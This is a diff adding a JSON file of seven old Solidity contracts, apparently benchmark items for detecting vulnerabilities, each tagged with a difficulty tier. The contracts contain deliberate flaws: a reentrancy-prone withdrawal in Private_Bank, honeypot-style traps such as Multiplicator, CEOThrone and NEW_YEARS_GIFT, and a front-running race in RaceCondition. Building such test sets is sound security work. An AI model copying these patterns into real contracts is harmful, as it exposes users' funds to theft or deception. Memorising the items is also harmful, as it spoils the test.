@@ -1,0 +1,65 @@
+[
+  {
+    "id": "sample_3_0000",
+    "language": "solidity",
+    "chain": "evm",
+    "file_content": "pragma solidity ^0.4.19;\n\ncontract Private_Bank\n{\n    mapping (address => uint) public balances;\n    \n    uint public MinDeposit = 1 ether;\n    \n    Log TransferLog;\n    \n    function Private_Bank(address _log)\n    {\n        TransferLog = Log(_log);\n    }\n    \n    function Deposit()\n    public\n    payable\n    {\n        if(msg.value >= MinDeposit)\n        {\n            balances[msg.sender]+=msg.value;\n            TransferLog.AddMessage(msg.sender,msg.value,\"Deposit\");\n        }\n    }\n    \n    function CashOut(uint _am)\n    {\n        if(_am<=balances[msg.sender])\n        {\n            \n            if(msg.sender.call.value(_am)())\n            {\n                balances[msg.sender]-=_am;\n                TransferLog.AddMessage(msg.sender,_am,\"CashOut\");\n            }\n        }\n    }\n    \n    function() public payable{}    \n    \n}\n\ncontract Log \n{\n   \n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n    \n    Message[] public History;\n    \n    Message LastMsg;\n    \n    function AddMessage(address _adr,uint _val,string _data)\n    public\n    {\n        LastMsg.Sender = _adr;\n        LastMsg.Time = now;\n        LastMsg.Val = _val;\n        LastMsg.Data = _data;\n        History.push(LastMsg);\n    }\n}\n",
+    "pragma": "^0.4.19",
+    "difficulty_tier": 3,
+    "context_level": "single_file"
+  },
+  {
+    "id": "sample_3_0001",
+    "language": "solidity",
+    "chain": "evm",
+    "file_content": "pragma solidity ^0.4.18;\n\ncontract Multiplicator\n{\n    address public Owner = msg.sender;\n   \n    function()payable{}\n   \n    function withdraw()\n    payable\n    public\n    {\n        require(msg.sender == Owner);\n        Owner.transfer(this.balance);\n    }\n    \n    function multiplicate(address adr)\n    payable\n    {\n        if(msg.value>=this.balance)\n        {        \n            adr.transfer(this.balance+msg.value);\n        }\n    }\n}\n\n",
+    "pragma": "^0.4.18",
+    "difficulty_tier": 3,
+    "context_level": "single_file"
+  },
+  {
+    "id": "sample_3_0002",
+    "language": "solidity",
+    "chain": "evm",
+    "file_content": "pragma solidity ^0.4.19;\n//\n//Live TEST ---- Please Do NOT use! Thanks! ----\n//\ncontract Ownable {\n    address public owner;\n    function Ownable() public {owner = msg.sender;}\n    modifier onlyOwner() {require(msg.sender == owner); _;\n    }\n}\n//CEO Throne .. The CEO with the highest stake gets the control over the contract\n//msg.value needs to be higher than largestStake when calling Stake()\n\ncontract CEOThrone is Ownable {\n    address public owner;\n    uint public largestStake;\n// Stake() function being called with 0xde20bc92 and ETH :: recommended gas limit 35.000\n// The sent ETH is checked against largestStake\n    function Stake() public payable {\n        // if you own the largest stake in a company, you own a company\n        if (msg.value > largestStake) {\n            owner = msg.sender;\n            largestStake = msg.value;\n        }\n    }\n// withdraw() function being called with 0x3ccfd60b :: recommened gas limit 30.000\n    function withdraw() public onlyOwner {\n        // only owner can withdraw funds\n        msg.sender.transfer(this.balance);\n    }\n}\n",
+    "pragma": "^0.4.19",
+    "difficulty_tier": 3,
+    "context_level": "single_file"
+  },
+  {
+    "id": "sample_3_0003",
+    "language": "solidity",
+    "chain": "evm",
+    "file_content": "*/\n\ncontract OpenAddressLottery{\n    struct SeedComponents{\n        uint component1;\n        uint component2;\n        uint component3;\n        uint component4;\n    }\n    \n    address owner; //address of the owner\n    uint private secretSeed; //seed used to calculate number of an address\n    uint private lastReseed; //last reseed - used to automatically reseed the contract every 1000 blocks\n    uint LuckyNumber = 7; //if the number of an address equals 7, it wins\n        \n    mapping (address => bool) winner; //keeping track of addresses that have already won\n    \n    function OpenAddressLottery() {\n        owner = msg.sender;\n        reseed(SeedComponents((uint)(block.coinbase), block.difficulty, block.gaslimit, block.timestamp)); //generate a quality random seed\n    }\n    \n    function participate() payable {\n        if(msg.value<0.1 ether)\n            return; //verify ticket price\n        \n        // make sure he hasn't won already\n        require(winner[msg.sender] == false);\n        \n        if(luckyNumberOfAddress(msg.sender) == LuckyNumber){ //check if it equals 7\n            winner[msg.sender] = true; // every address can only win once\n            \n            uint win=msg.value*7; //win = 7 times the ticket price\n            \n            if(win>this.balance) //if the balance isnt sufficient...\n                win=this.balance; //...send everything we've got\n            msg.sender.transfer(win);\n        }\n        \n        if(block.number-lastReseed>1000) //reseed if needed\n            reseed(SeedComponents((uint)(block.coinbase), block.difficulty, block.gaslimit, block.timestamp)); //generate a quality random seed\n    }\n    \n    function luckyNumberOfAddress(address addr) constant returns(uint n){\n        // calculate the number of current address - 1 in 8 chance\n        n = uint(keccak256(uint(addr), secretSeed)[0]) % 8;\n    }\n    \n    function reseed(SeedComponents components) internal {\n        secretSeed = uint256(keccak256(\n            components.component1,\n            components.component2,\n            components.component3,\n            components.component4\n        )); //hash the incoming parameters and use the hash to (re)initialize the seed\n        lastReseed = block.number;\n    }\n    \n    function kill() {\n        require(msg.sender==owner);\n        \n        selfdestruct(msg.sender);\n    }\n    \n    function forceReseed() { //reseed initiated by the owner - for testing purposes\n        require(msg.sender==owner);\n        \n        SeedComponents s;\n        s.component1 = uint(msg.sender);\n        s.component2 = uint256(block.blockhash(block.number - 1));\n        s.component3 = block.difficulty*(uint)(block.coinbase);\n        s.component4 = tx.gasprice * 7;\n        \n        reseed(s); //reseed\n    }\n    \n    function () payable { //if someone sends money without any function call, just assume he wanted to participate\n        if(msg.value>=0.1 ether && msg.sender!=owner) //owner can't participate, he can only fund the jackpot\n            participate();\n    }\n\n}\n",
+    "pragma": "unknown",
+    "difficulty_tier": 3,
+    "context_level": "single_file"
+  },
+  {
+    "id": "sample_3_0004",
+    "language": "solidity",
+    "chain": "evm",
+    "file_content": "pragma solidity ^0.4.19;\n\ncontract NEW_YEARS_GIFT\n{\n    string message;\n    \n    bool passHasBeenSet = false;\n    \n    address sender;\n    \n    bytes32 public hashPass;\n\t\n    function() public payable{}\n    \n    function GetHash(bytes pass) public constant returns (bytes32) {return sha3(pass);}\n    \n    function SetPass(bytes32 hash)\n    public\n    payable\n    {\n        if( (!passHasBeenSet&&(msg.value > 1 ether)) || hashPass==0x0 )\n        {\n            hashPass = hash;\n            sender = msg.sender;\n        }\n    }\n    \n    function SetMessage(string _message)\n    public\n    {\n        if(msg.sender==sender)\n        {\n            message =_message;\n        }\n    }\n    \n    function GetGift(bytes pass)\n    external\n    payable\n    returns (string)\n    {\n        if(hashPass == sha3(pass))\n        {\n            msg.sender.transfer(this.balance);\n            return message;\n        }\n    }\n    \n    function Revoce()\n    public\n    payable\n    {\n        if(msg.sender==sender)\n        {\n            sender.transfer(this.balance);\n            message=\"\";\n        }\n    }\n    \n    function PassHasBeenSet(bytes32 hash)\n    public\n    {\n        if(msg.sender==sender&&hash==hashPass)\n        {\n           passHasBeenSet=true;\n        }\n    }\n}\n",
+    "pragma": "^0.4.19",
+    "difficulty_tier": 3,
+    "context_level": "single_file"
+  },
+  {
+    "id": "sample_3_0005",
+    "language": "solidity",
+    "chain": "evm",
+    "file_content": "pragma solidity ^0.4.18;\n\ncontract Test1\n{\n    address owner = msg.sender;\n    \n    function withdraw()\n    payable\n    public\n    {\n        require(msg.sender==owner);\n        owner.transfer(this.balance);\n    }\n    \n    function() payable {}\n    \n    function Test()\n    payable\n    public\n    {\n        if(msg.value>=1 ether)\n        {\n            \n            var i1 = 1;\n            var i2 = 0;\n            var amX2 = msg.value*2;\n            \n            while(true)\n            {\n                if(i1<i2)break;\n                if(i1>amX2)break;\n                \n                i2=i1;\n                i1++;\n            }\n            msg.sender.transfer(i2);\n        }\n    }\n}\n",
+    "pragma": "^0.4.18",
+    "difficulty_tier": 3,
+    "context_level": "single_file"
+  },
+  {
+    "id": "sample_3_0006",
+    "language": "solidity",
+    "chain": "evm",
+    "file_content": "pragma solidity ^0.4.16;\n\n// https://github.com/ethereum/EIPs/issues/20\ncontract ERC20 {\n    function totalSupply() constant returns (uint totalSupply);\n    function balanceOf(address _owner) constant returns (uint balance);\n    function transfer(address _to, uint _value) returns (bool success);\n    function transferFrom(address _from, address _to, uint _value) returns (bool success);\n    function approve(address _spender, uint _value) returns (bool success);\n    function allowance(address _owner, address _spender) constant returns (uint remaining);\n    event Transfer(address indexed _from, address indexed _to, uint _value);\n    event Approval(address indexed _owner, address indexed _spender, uint _value);\n}\n\ncontract RaceCondition{\n    address private owner;\n    uint public price;\n    ERC20 token;\n\n    function RaceCondition(uint _price, ERC20 _token)\n        public \n    {\n        owner = msg.sender;\n        price = _price;\n        token = _token;\n    }\n\n    // If the owner sees someone calls buy\n    // he can call changePrice to set a new price\n    // If his transaction is mined first, he can\n    // receive more tokens than excepted by the new buyer\n    function buy(uint new_price) payable\n        public\n    {\n        require(msg.value >= price);\n\n        // we assume that the RaceCondition contract\n        // has enough allowance\n        token.transferFrom(msg.sender, owner, price);\n\n        price = new_price;\n        owner = msg.sender;\n    }\n\n    function changePrice(uint new_price){\n        require(msg.sender == owner);\n        price = new_price; \n    }\n\n}\n",
+    "pragma": "^0.4.16",
+    "difficulty_tier": 3,
+    "context_level": "single_file"
+  }
+]
